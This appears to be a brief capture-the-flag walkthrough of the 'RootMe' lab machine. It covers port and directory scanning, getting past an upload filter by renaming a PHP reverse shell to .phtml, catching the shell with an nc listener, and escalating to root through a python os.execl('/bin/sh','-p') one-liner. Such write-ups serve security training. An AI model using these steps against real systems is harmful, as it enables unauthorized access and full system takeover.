#RootME Writeup by Rumble ^^ 

#ip= machineip 

#Task1 

Not much in there just suitup and deploy 

#Task2 

`````````
So lets begin with some scans to the ports using nmap $

# Command>>  nmap -sV -sC -oA ./initalscan $ip -Pn

And in thesametime lets run some dir attack using gobuster 

# Command>> gobuster dir -u $ip -w directory-list-lowercase-2.3-medium.txt -o ./buster

`````````
#Questions: on Nmap and gobuster 
  1-  Scan the machine, how many ports are open?  2
  2-  What version of Apache are running? 2.4.29 
  3-  What service is running on port 22? SSH
  5-  What is the hidden directory? /panel/



#Task3 

```````
After we used gobuster we got some dir one of them was /uploads lets use it to get shell. 

So we have to bypass it since we cant upload our php shell 
>> We did it by changing the ext for the reverseshell to <phtml>
>> Now lets start our Revshell using nc 

# Command>> nc -lvvp 7773
# Get stable shell ^^ using any method 

# find / -name user.txt 2>dev/null  to locate the user.txt dir 
```````
#Questions: user.txt flag 
 1- just cat the /var/www/user.txt



#Task4 

``````
Using any PE way we can get root for me I used this command and then head to GTFOBins to see if there is any thing and I found that /usr/bin/python creepy little bit so used google to see if I can get a sudo 

# Command>> python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

`````` 
#Last flag 
 1-  Since you have the root P you can claim it 


^^ 



